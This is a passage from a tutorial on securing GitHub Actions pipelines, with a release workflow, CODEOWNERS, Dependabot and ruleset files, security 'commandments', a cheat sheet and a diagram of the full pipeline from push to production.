          gh attestation verify oci://${{ env.IMAGE_REPO }}@${{ steps.build.outputs.digest }} \\
            --owner ${{ github.repository_owner }} \\
            --signer-workflow ${{ github.repository }}/.github/workflows/release.yml
          \`\`\`
          EOF

  # === Job 3: Promote to config repo (May 10) ===
  promote-to-dev:
    needs: build-and-sign
    if: github.event_name == 'push'   # auto-promote dev on push to main
    runs-on: ubuntu-22.04-arm
    environment:
      name: dev
      url: https://argocd.example.com/applications/myapp-dev
    permissions:
      contents: read
    steps:
      # GitHub App token for cross-repo write to config repo (May 10)
      - name: Mint config-repo App token
        id: app-token
        uses: actions/create-github-app-token@31c86eb3b33c9b601a1f60f98dcbfd1d70f379b4 # v2.0.6
        with:
          app-id: ${{ vars.CONFIG_REPO_APP_ID }}
          private-key: ${{ secrets.CONFIG_REPO_APP_PRIVATE_KEY }}
          owner: ${{ github.repository_owner }}
          repositories: my-config-repo

      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1
        with:
          repository: ${{ github.repository_owner }}/my-config-repo
          token: ${{ steps.app-token.outputs.token }}
          path: cfg
          fetch-depth: 0

      - name: Bump dev digest
        working-directory: cfg
        env:
          NEW_DIGEST: ${{ needs.build-and-sign.outputs.digest }}
        run: |
          yq -i '.image.digest = strenv(NEW_DIGEST)' apps/myapp/envs/dev/values.yaml
          git config user.email "deploy-bot[bot]@users.noreply.github.com"
          git config user.name "deploy-bot[bot]"
          git add apps/myapp/envs/dev/values.yaml
          git commit -m "chore(myapp): bump dev to ${NEW_DIGEST}"
          git push origin main

  # === Job 4: Open promotion PR for stg (May 10) ===
  open-stg-promotion-pr:
    needs: [build-and-sign, promote-to-dev]
    runs-on: ubuntu-22.04-arm
    permissions:
      contents: read
    steps:
      - name: Mint App token
        id: app-token
        uses: actions/create-github-app-token@31c86eb3b33c9b601a1f60f98dcbfd1d70f379b4 # v2.0.6
        with:
          app-id: ${{ vars.CONFIG_REPO_APP_ID }}
          private-key: ${{ secrets.CONFIG_REPO_APP_PRIVATE_KEY }}
          owner: ${{ github.repository_owner }}
          repositories: my-config-repo

      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1
        with:
          repository: ${{ github.repository_owner }}/my-config-repo
          token: ${{ steps.app-token.outputs.token }}
          path: cfg

      - name: Update stg values
        working-directory: cfg
        env:
          NEW_DIGEST: ${{ needs.build-and-sign.outputs.digest }}
        run: |
          yq -i '.image.digest = strenv(NEW_DIGEST)' apps/myapp/envs/stg/values.yaml

      - uses: peter-evans/create-pull-request@70a41aba780001da0a30141984ae2a0c95d8704e # v6.0.2
        with:
          path: cfg
          token: ${{ steps.app-token.outputs.token }}
          branch: promote/myapp-stg-${{ github.run_id }}
          delete-branch: true
          commit-message: "chore(myapp): promote dev->stg ${{ needs.build-and-sign.outputs.digest }}"
          title: "Promote myapp dev->stg"
          body: |
            Auto-promote from dev. Image attestation verifiable:
            ```
            gh attestation verify oci://${{ env.IMAGE_REPO }}@${{ needs.build-and-sign.outputs.digest }} \
              --owner ${{ github.repository_owner }} \
              --signer-workflow ${{ github.repository }}/.github/workflows/release.yml
            ```
          signoff: true
          labels: env:stg, promotion

  # === Job 5: Required-check aggregator (ruleset target) ===
  release-pipeline-status:
    if: always()
    needs: [dependency-review, build-and-sign, promote-to-dev]
    runs-on: ubuntu-22.04-arm
    steps:
      - name: Verify upstream jobs succeeded or were skipped
        # success OR skipped (path-filtered jobs not running) are both OK;
        # failure or cancelled fails the aggregator, which fails the required check.
        run: |
          [[ "${{ needs.dependency-review.result }}" =~ ^(success|skipped)$ ]] || exit 1
          [[ "${{ needs.build-and-sign.result }}"   =~ ^(success|skipped)$ ]] || exit 1
          [[ "${{ needs.promote-to-dev.result }}"   =~ ^(success|skipped)$ ]] || exit 1
```

What this composes:

- **May 5**: concurrency group, top-level `permissions: contents: read`, `workflow_dispatch` with input, status-aggregator pattern
- **May 6**: dependency-review on PRs, paths-filter pattern (via the `if:` guards on jobs)
- **May 7**: OIDC to AWS, ECR push, Trivy fail-on-CVE, Cosign keyless sign-by-digest, BuildKit provenance + SBOM
- **May 10**: GitHub App token via `create-github-app-token`, two-repo cross-write, `environment: dev` for env-scoped secrets, PR-promote pattern for stg
- **Today**: SHA-pinned every action, arm64 runner, `attest-build-provenance` for SLSA provenance, `GITHUB_STEP_SUMMARY` release receipt, ruleset-targetable aggregator job

This is the full Phase 2.7 stack.

---

## Part 14: The Companion Config Files

The three files that lock down the repo alongside `release.yml`.

### `.github/CODEOWNERS`

```bash
# Repo-wide default
*                              @my-org/engineering

# Security-team approval required for workflows + supply-chain config
/.github/workflows/            @my-org/security-team
/.github/actions/              @my-org/security-team
/.github/dependabot.yml        @my-org/security-team
/.github/CODEOWNERS            @my-org/security-team

# Platform team owns release pipeline jointly with security
/.github/workflows/release.yml @my-org/security-team @my-org/platform-team

# IaC requires platform review
/terraform/                    @my-org/platform-team
/charts/                       @my-org/platform-team
```

### `.github/dependabot.yml`

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/New_York"
    open-pull-requests-limit: 10
    cooldown:
      default-days: 7
      semver-major-days: 14
    groups:
      actions-minor-and-patch:
        update-types: ["minor", "patch"]
        applies-to: version-updates
      actions-security:
        applies-to: security-updates
    reviewers:
      - "my-org/security-team"
    labels: [dependencies, github-actions]
    commit-message:
      prefix: "chore(deps)"
      include: "scope"

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    cooldown:
      default-days: 7

  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    cooldown:
      default-days: 7
    groups:
      npm-minor-and-patch:
        update-types: ["minor", "patch"]
```

### Ruleset (created via API)

```jsonc
// POST /repos/{owner}/{repo}/rulesets
{
  "name": "main-branch-protection",
  "target": "branch",
  "enforcement": "active",
  "conditions": { "ref_name": { "include": ["refs/heads/main"], "exclude": [] } },
  "bypass_actors": [
    { "actor_id": 12345, "actor_type": "Team", "bypass_mode": "pull_request" }
  ],
  "rules": [
    { "type": "deletion" },
    { "type": "non_fast_forward" },
    { "type": "required_linear_history" },
    { "type": "required_signatures" },
    {
      "type": "pull_request",
      "parameters": {
        "required_approving_review_count": 2,
        "dismiss_stale_reviews_on_push": true,
        "require_code_owner_review": true,
        "require_last_push_approval": true,
        "required_review_thread_resolution": true
      }
    },
    {
      "type": "required_status_checks",
      "parameters": {
        "strict_required_status_checks_policy": true,
        "required_status_checks": [
          // integration_id 15368 = GitHub Actions on github.com.
          // Use `gh api /repos/{o}/{r}/installations` to find your IDs.
          { "context": "release-pipeline-status", "integration_id": 15368 }
        ]
      }
    },
    { "type": "required_deployments", "parameters": { "required_deployment_environments": ["dev"] } }
  ]
}
```

Apply via:

```bash
gh api -X POST /repos/my-org/my-repo/rulesets --input ruleset.json
```

---

## Part 15: The 10 Commandments of GitHub Actions Security

1. **Thou shalt pin every action by its 40-character SHA, with a trailing `# vX.Y.Z` comment for Dependabot.** Tags are stickers; SHAs are content. `tj-actions` would have been a non-event for SHA-pinners.
2. **Thou shalt declare `permissions: contents: read` at the top of every workflow, then opt in per job.** The default is unsafe on legacy repos; the explicit declaration is the only one you can audit.
3. **Thou shalt prefer OIDC over stored credentials for everything that supports it.** AWS, GCP, Azure, HCP Vault, Snowflake, Datadog, npm, PyPI, Sigstore -- all support OIDC in 2026. Stored credentials are the legacy default; OIDC is the production default.
4. **Thou shalt scope secrets at the environment tier for anything prod-bearing.** Environment secrets are not injected until protection rules pass. The OIDC `sub:environment:production` claim composes with this on the AWS side -- no prod creds are issued without GitHub already enforcing human approval.
5. **Thou shalt never attach a self-hosted runner to a public repository.** This is the only "never" in the manual. ARC on a dedicated cluster for private repos; larger hosted runners for everything else.
6. **Thou shalt run ephemeral runners exclusively.** Single-job lifetime. JIT tokens. No persistence. Lateral movement requires persistence; remove the persistence and you remove the entire class of attack.
7. **Thou shalt protect `main` with a Ruleset, not classic branch protection.** Required signed commits, required PR reviews from CODEOWNERS, required status checks via the status-aggregator pattern, required linear history, bypass actors in "Pull request only" mode.
8. **Thou shalt gate `.github/workflows/` and `.github/dependabot.yml` behind CODEOWNERS + required-CODEOWNERS-review.** The single highest-leverage CODEOWNERS rule in the repo. Every supply-chain change passes through a security reviewer's eyeballs.
9. **Thou shalt produce both a Cosign signature and a GitHub-native attestation for every artifact, signed by the same OIDC identity.** Cosign for OCI-native verification at admission; attestation for SLSA provenance. The cluster (May 10's ArgoCD handoff) verifies both via Kyverno before admitting any pod.
10. **Thou shalt export the audit log to a SIEM with 2+ year retention before you need it.** Every preventive control fails eventually; the audit log is the only defense that works after the breach. Pair with CloudTrail `AssumeRoleWithWebIdentity` correlation for full chain-of-custody on every OIDC handshake.

---

## Part 16: Cheat Sheet -- The One-Page Reference

```yaml
# ===== SHA pinning =====
uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1

# ===== Default permissions block (top of every workflow) =====
permissions:
  contents: read
# then opt in per job:
permissions:
  id-token: write       # OIDC
  contents: read         # checkout
  packages: write         # ECR / GHCR
  attestations: write     # actions/attest-build-provenance
  pull-requests: write    # bot writes PR comments / opens PRs
  deployments: write      # ArgoCD Notifications target

# ===== Secret precedence =====
# Environment > Repository > Organization (on name collision)

# ===== OIDC sub formats (May 7) =====
# Branch:      repo:org/repo:ref:refs/heads/main
# Environment: repo:org/repo:environment:production
# Tag:         repo:org/repo:ref:refs/tags/v1.2.3
# PR (avoid):  repo:org/repo:pull_request

# ===== Dependency review action =====
- uses: actions/dependency-review-action@5a2ce3f5b92313e4045dd0d4a9eaa0e9d5e23d18 # v4.5.0
  with: { fail-on-severity: high, comment-summary-in-pr: on-failure }

# ===== arm64 runner labels =====
runs-on: ubuntu-22.04-arm        # arm64 standard
runs-on: ubuntu-22.04-arm-8core  # arm64 larger

# ===== Jan 2026 pricing (Linux per-min) =====
# x64: 2c $0.008  4c $0.012  8c $0.022  16c $0.042  32c $0.082  64c $0.162
# arm: 2c $0.005  4c $0.008  8c $0.014  16c $0.026  32c $0.050  64c $0.098
#   (arm64 = 37% cheaper at every tier)

# ===== ARC skeleton =====
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata: { name: my-runners, namespace: arc-runners }
spec:
  githubConfigUrl: https://github.com/my-org
  githubConfigSecret: gh-app-credentials      # GitHub App, not PAT
  minRunners: 0
  maxRunners: 50
  template:
    spec:
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:2.330.0

# ===== Attestation + verification =====
# v4 is current; it wraps actions/attest. Resolve current SHA with:
#   gh api repos/actions/attest-build-provenance/releases/latest
- uses: actions/attest-build-provenance@7668571508540a607bdfd90a87a560489fe372eb # v4.0.0
  with: { subject-name: $IMG, subject-digest: $DIGEST, push-to-registry: true }

# at deploy time:
gh attestation verify "oci://${IMG}@${DIGEST}" \
  --owner my-org \
  --signer-workflow my-org/my-repo/.github/workflows/release.yml

# ===== Job summary + annotations =====
echo "## My Summary" >> "$GITHUB_STEP_SUMMARY"
echo "::notice file=app.py,line=42::Consider rotating this"
echo "::warning file=app.py,line=42::Stale dependency"
echo "::error file=app.py,line=42::Failed lint"
echo "::add-mask::$DERIVED_TOKEN"

# ===== Required-check status-aggregator (Ruleset target) =====
release-pipeline-status:
  if: always()
  needs: [job1, job2, job3]
  runs-on: ubuntu-22.04-arm
  steps:
    - run: |
        [[ "${{ needs.job1.result }}" =~ ^(success|skipped)$ ]] || exit 1
        # ...
```

---

## Part 17: Phase 2.7 Capstone -- The Complete CI/CD Pipeline, May 5 -> May 11

This is the full mental model crystallized. Walk it through.

```
                    PHASE 2.7 CI/CD CAPSTONE (May 5 -> May 11)
                    =============================================

1. DEVELOPER PUSHES                          [May 5: workflow trigger]
   git push origin feature/new-thing
       |
       v
2. PR-CI runs on hardened ephemeral runner   [May 5/11: ephemeral + SHA-pinned actions]
   - SHA-pinned actions only                 [May 11: tj-actions defense]
   - permissions: contents: read              [May 11: least privilege]
   - dependency-review-action                 [May 11: supply chain]
   - pinact --check                           [May 11: prevent tag-form regression]
   - test, lint, security-scan                [May 5: matrix + concurrency]
       |
       v
3. Branch protection ruleset gates merge     [May 11: Rulesets, not classic]
   - required signed commits
   - required CODEOWNERS approval on workflows
   - required status-check: release-pipeline-status (aggregator)
   - bypass mode: pull_request only (no "Always")
       |
       v
4. Merge to main triggers release.yml        [May 5: push trigger]
       |
       v
5. Build with OIDC -> AWS ECR                [May 7: OIDC short-lived creds]
   - configure-aws-credentials with branch-scoped sub
   - amazon-ecr-login
   - docker buildx with cache + provenance + SBOM
       |
       v
6. Scan + Sign + Attest                      [May 7: Cosign + May 11: attestation]
   - trivy scan, fail on HIGH/CRITICAL
   - cosign sign --yes IMG@DIGEST (keyless via Fulcio/Rekor)
   - actions/attest-build-provenance (SLSA v1.0)
   - GITHUB_STEP_SUMMARY release receipt
       |
       v
7. ECR push completes; outputs.digest set    [May 7: sign-by-digest discipline]
       |
       v
8. CI mints GitHub App token                 [May 10: cross-repo writes]
   - actions/create-github-app-token
   - 1-hour expiry; per-install scoped
       |
       v
9. CI commits digest to config repo          [May 10: GitOps handoff principle]
   - yq update apps/myapp/envs/dev/values.yaml
   - git commit + git push (dev: direct)
   - opens PR for stg promotion
       |
       v
10. ArgoCD detects commit; reconciles dev    [May 10: pull-based, not push]
        |
        v
11. Kyverno admission webhook verifies       [May 11 NEW: cluster admission gate
    - cosign signature: same OIDC identity?     introduced today; sits between
    - attestation: workflow == release.yml      ArgoCD's apply (May 10) and the
      on refs/heads/main?                       cluster accepting the Pod]
    - REJECTS if either fails
        |
        v
12. Pod admitted; rollout proceeds           [May 10: ArgoCD applies Helm]
        |
        v
13. ArgoCD Notifications fires               [May 10: radio loop]
    - on-deployed: commit status -> PR check
    - on-health-degraded: Deployments API update
        |
        v
14. Promote to stg via PR                    [May 10: PR-based promotion]
        |
        v
15. GitHub Environment "stg" gate            [May 11: environment protection]
    - required reviewer: SRE team
    - wait timer: 0 min (stg is fast)
    - env-scoped secrets injected only after approval
        |
        v
16. Environment-scoped OIDC sub for stg      [May 7/10/11: environment composition]
    - OIDC sub: repo:org/repo:environment:stg
    - AWS trust policy gates on this exact sub
    - prod creds CANNOT be issued without GitHub already approving
        |
        v
17. ArgoCD stg reconciles; same verify       [May 11: admission at every cluster]
        |
        v
18. Tag v1.2.3 for prod release              [May 10: tag-driven prod]
        |
        v
19. Tag ruleset prevents force-push          [May 11: immutable tag protection]
    - tag deletion forbidden                    Two distinct concerns this layer
    - non-fast-forward forbidden                covers:
                                                (a) prod-tag-as-release-gate for
                                                    YOUR own deploys (only
                                                    immutable v* triggers prod)
                                                (b) downstream SHA-pinners who
                                                    pin to your tag stay safe
                                                    because the tag cannot move
        |
        v
20. GitHub Environment "prod" gate           [May 11: dual-control safe]
    - required reviewers: 2 (SRE + eng-lead)
    - prevent self-review: yes
    - wait timer: 30 min
    - deployment branch policy: tags only (refs/tags/v*)
        |
        v
21. ArgoCD prod reconciles; Kyverno verifies [May 11: SLSA Level 3 in practice]
        |
        v
22. Audit log records every step             [May 11: surveillance archive]
    - workflow run event
    - OIDC token issuance (sub claim)
    - environment approval event
    - ArgoCD sync event (via Deployments API)
    - exported nightly to S3 + queryable in Athena
    - CloudTrail correlation: each AssumeRoleWithWebIdentity matches workflow

                    ===  THE LOOP IS CLOSED  ===
```

What this gives you, in one sentence: **a developer push that becomes a production deployment with eight independent security gates (least-priv permissions, SHA-pinned actions, ruleset on main, OIDC short-lived creds, two-signature attestation, environment dual-control, admission verification, immutable audit log) and a queryable audit trail at every step.** No single compromise -- not a stolen PAT, not a poisoned third-party action, not a malicious insider PR, not a runner compromise -- gives the attacker production. That is the bank vault. That is the capstone of Phase 2.7.

---

## Further Reading

- The **2026 GitHub Actions Security Roadmap** -- workflow dependencies, immutable releases, scoped secrets, native egress firewall: <https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/>
- **StepSecurity Harden-Runner** -- eBPF-based runtime monitoring that would have caught the tj-actions payload even on unpinned actions: <https://github.com/step-security/harden-runner>
- **OpenSSF Scorecard** -- automated audit including SHA-pinning compliance, publishable badge: <https://github.com/ossf/scorecard>
- **CISA KEV entry for CVE-2025-30066** -- the federal-compliance angle on tj-actions: <https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction>
- **GitHub-native Required Workflows** -- the next layer up: org-level workflows that cannot be disabled per-repo, ideal home for SBOM generation and license scanning
- **Sigstore Policy Controller / Kyverno verifyImages** -- the admission-layer closure that turns SLSA provenance into a hard runtime gate, the cluster-side companion to today's `attest-build-provenance`

---

## Key Takeaways

- **Defense in depth = independence, not redundancy.** Each layer defeats a different named attacker capability. Remove any one and you have a specific CVE-shaped hole.
- **SHA pinning is non-negotiable.** Tags are stickers; SHAs are content. `tj-actions` was a non-event for SHA-pinners and a 23,000-repo breach for tag-pinners.
- **OIDC + environment-scoped secrets** is the only acceptable posture for prod credentials. No long-lived AWS keys; no env-secrets without `environment:` on the job.
- **Rulesets, not classic branch protection.** Compose additively, smart status-check matching, tag protection, org-level enforcement.
- **Ephemeral runners exclusively.** Persistent runners are persistent compromise surfaces. ARC + JIT tokens or larger hosted runners.
- **Cosign + attestation together.** Wax seal on bytes plus notarized shipping manifest. Both signed by the same OIDC identity. Both verified at admission via Kyverno.
- **Audit log to your SIEM with 2+ year retention.** Every other control is preventive; the audit log is the only post-breach defense. Pair with CloudTrail OIDC sub correlation.
- **arm64 hosted runners save 37%.** Default to them unless you need x86-only binaries.
- **The full Phase 2.7 pipeline** is eight independent security gates from developer push to production pod, with an immutable audit trail at every step.
